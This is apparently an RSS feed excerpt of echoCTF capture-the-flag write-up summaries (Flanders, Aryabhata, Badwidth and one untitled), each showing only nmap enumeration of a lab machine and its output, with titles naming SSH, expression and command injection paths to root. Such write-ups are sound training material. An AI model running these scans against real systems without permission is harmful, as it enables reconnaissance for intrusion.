+ &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/5FD9b_P4jRE?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video">&lt;/iframe>
+ &lt;/div>
+
+&lt;p>&lt;a href="https://www.youtube.com/watch?v=5FD9b_P4jREs">&lt;img src="https://img.shields.io/badge/Watch%20on-YouTube-red?logo=youtube" alt="Watch on YouTube">&lt;/a>&lt;/p>
+&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;p>Start by port scanning the target machine&lt;/p>
+&lt;h2 id="nmap">NMAP&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -vv -Pn -p- -T4 10.0.50.0 -sC -sV
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="nmap-output">NMAP Output&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE REASON VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh syn-ack ttl &lt;span class="m">63&lt;/span> OpenSSH 8.4p1 Debian 5+deb11u2 &lt;span class="o">(&lt;/span>protocol 2.0&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssh-hostkey: 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">3072&lt;/span> 8c:e1:6f:39:a7:65:ac:64:06:c6:43:72:40:ca:3f:64 &lt;span class="o">(&lt;/span>RSA&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCeHruyMrJp6Aoww8WvypDa5GOOAa5d1wSC5fpaJ9CS8izg9dtWJOarrrZGAPgvA4RMa3a3qdapuUt342oLKfadUQKwZA9wHupAivBCLN1HmjN2RCOAmXHxTWse3cz0cv9ZEAHxtvNBO0nWmf63DrEAeDJXpkgV/dOgYHtll2yoDs0apKrdP7b3Br3YaGwUF/bVN6+WhTp9d2AXuHfDy28pe+a2t2YjuAwy34NlS7qjDyY1mqrBTyb7B7ZEwrPJjmli3iZA/9Ge//8O9mxCdW70IdMLbGrZ+fL0FHTvdP8Y/tOUndoCnY3BX3N4Jk44c5yxm0yPVMfYgBlST/tua0czRP3/qnM+KmoyDPGDwSFP1yaLSWL4OvVILOwqCzh7UsX/Z2lODK4QlxmP6jU2i2H3nOBA+T/I4BktAaIA7NB8Vn8DKEgu2iAT6JUVVapoFMvUUNgkqJYywMrx/39ZCyIOmg4XAniqmRgIIU02S5HylqWQQcaDylbqtrt1GmPLpUM&lt;span class="o">=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">256&lt;/span> 2b:30:87:a5:9f:44:b8:3b:65:7e:94:75:e6:61:8f:97 &lt;span class="o">(&lt;/span>ECDSA&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAwOrlGNc9A2kRYgbsM/dEziRmuM5PlVnN6Fig5UbRsJPGePGPD/pfkwTALxvOULoYWhRZesLQEBFFwM+XFHQHA&lt;span class="o">=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">256&lt;/span> 15:e2:f7:e4:fa:0a:29:e3:7e:ce:36:ae:9f:3e:75:ac &lt;span class="o">(&lt;/span>ED25519&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINbIqZ2bHXwtkxS6Xm5dSUDBOJFo39M5VqA1lfSLnAC0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1337/tcp open http syn-ack ttl &lt;span class="m">63&lt;/span> nginx 1.18.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: nginx/1.18.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Contact Manager
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: OS: Linux&lt;span class="p">;&lt;/span> CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The nmap scan shows 2 ports open.
+Port 22 is SSH
+Port 1337, runs an nginx 1.18.0 web server.&lt;/p></description></item><item><title>echoCTF Flanders Writeup: Vulnerable SSH version to Root</title><link>https://hack.com.cy/writeups/echoctf/flanders/flanders/</link><pubDate>Wed, 25 Jun 2025 00:00:00 +0000</pubDate><guid>https://hack.com.cy/writeups/echoctf/flanders/flanders/</guid><description>&lt;h2 id="video-walkthrough">Video Walkthrough&lt;/h2>
+&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+ &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/HwbOIk1GpUw?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video">&lt;/iframe>
+ &lt;/div>
+
+&lt;p>&lt;a href="https://www.youtube.com/watch?v=HwbOIk1GpUw">&lt;img src="https://img.shields.io/badge/Watch%20on-YouTube-red?logo=youtube" alt="Watch on YouTube">&lt;/a>&lt;/p>
+&lt;h1 id="flanders">Flanders&lt;/h1>
+&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;h2 id="nmap-port-scan">NMAP Port Scan&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo nmap -vv -p- 10.0.50.0 -T4 -sC -sV -oA nmap/allports
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="output">Output&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE REASON VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">6022/tcp open ssh syn-ack ttl &lt;span class="m">63&lt;/span> libssh 0.8.1 &lt;span class="o">(&lt;/span>protocol 2.0&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssh-hostkey: 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">2048&lt;/span> 9c:42:2e:fa:60:30:95:dd:a0:60:80:1f:fd:ae:77:86 &lt;span class="o">(&lt;/span>RSA&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF7bYwrFoV/ukt+Dv8+2ZbdxEoyYGkvq8tEO7cbR9jTl96QN//1v8lOw4o0b26uA7wHBWs5+zPZm6SeGIazx+Bj3mih6Oofm/9HU+FLHTCb+uo5kaG6v8g7gwjkoFNyx/rn+G+BKAMY6op4+6P6CqFFv1yfEhVWWqItla0kmfp3jwD1HCd/i0OxFsUN335RYeokeLqrG1kpoyVlsiqHMZWbz7DUDE2BjTVy1WcZAJtukCa7OHJKMZuh/AVCrCUuTrA3TRHJdl4+AR1GpI+UscHwmwZRsRsVAwgjC7v93fdD+zmrTth15XH7vXYkUK/ZAyaK8cAJOg2lCeNCwuw5OWh
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Analyzing the NMAP output we can see that we found port 6022 open, and it seems that is SSH. We can also view the version of the SSH service (libss 0.8.1).&lt;/p></description></item><item><title>echoCTF Aryabhata Writeup: From Server Site Expression Injection to root</title><link>https://hack.com.cy/writeups/echoctf/aryabhata/aryabhata/</link><pubDate>Tue, 03 Jun 2025 00:00:00 +0000</pubDate><guid>https://hack.com.cy/writeups/echoctf/aryabhata/aryabhata/</guid><description>&lt;p>Start by port scanning the target machine.&lt;/p>
+&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;h2 id="nmap">NMAP&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo nmap -nvv -p- 10.0.50.0 -T4 -A -oA nmap/writeup
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="nmap-output">NMAP OUTPUT&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE REASON VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http syn-ack ttl &lt;span class="m">63&lt;/span> nginx 1.10.3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: nginx/1.10.3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Welcome to Aryabhata
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">9229/tcp open http syn-ack ttl &lt;span class="m">63&lt;/span> nginx 1.10.3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: nginx/1.10.3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: &lt;span class="m">502&lt;/span> Bad Gateway
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>NMAP results show us that there are 2 nginx webserver running on ports &lt;code>80&lt;/code> and &lt;code>9229&lt;/code>
+Port &lt;code>80&lt;/code> return a web application which has calculation functionality while port &lt;code>9229&lt;/code> gives us back a &lt;code>502 Bad Gateway&lt;/code>&lt;/p></description></item><item><title>echoCTF Badwidth Writeup: Command Injection to Root</title><link>https://hack.com.cy/writeups/echoctf/badwidth/badwidth/</link><pubDate>Tue, 03 Jun 2025 00:00:00 +0000</pubDate><guid>https://hack.com.cy/writeups/echoctf/badwidth/badwidth/</guid><description>&lt;h2 id="video-walkthrough">Video Walkthrough&lt;/h2>
+&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+ &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/QZlXwNCp16k?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video">&lt;/iframe>
+ &lt;/div>
+
+&lt;p>&lt;a href="https://www.youtube.com/watch?v=QZlXwNCp16k&amp;amp;t=1s">&lt;img src="https://img.shields.io/badge/Watch%20on-YouTube-red?logo=youtube" alt="Watch on YouTube">&lt;/a>&lt;/p>
+&lt;h1 id="badwidth">Badwidth&lt;/h1>
+&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;h2 id="nmap-port-scan">NMAP Port Scan&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo nmap -nvv -p- 10.0.50.0 -T4 -sC -sV
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="output">Output&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE REASON VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1337/tcp open http syn-ack ttl &lt;span class="m">63&lt;/span> Node.js Express framework
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Site doesn&lt;span class="err">&amp;#39;&lt;/span>t have a title &lt;span class="o">(&lt;/span>text/plain&lt;span class="p">;&lt;/span> &lt;span class="nv">charset&lt;/span>&lt;span class="o">=&lt;/span>utf-8&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> http-methods: 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ Supported Methods: POST GET HEAD
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Analyzing the NMAP scan we can see there is 1 port open 1337.
+It seems that its a webserver using &lt;code>Node.js Express framework&lt;/code>.&lt;/p></description></item></channel></rss>
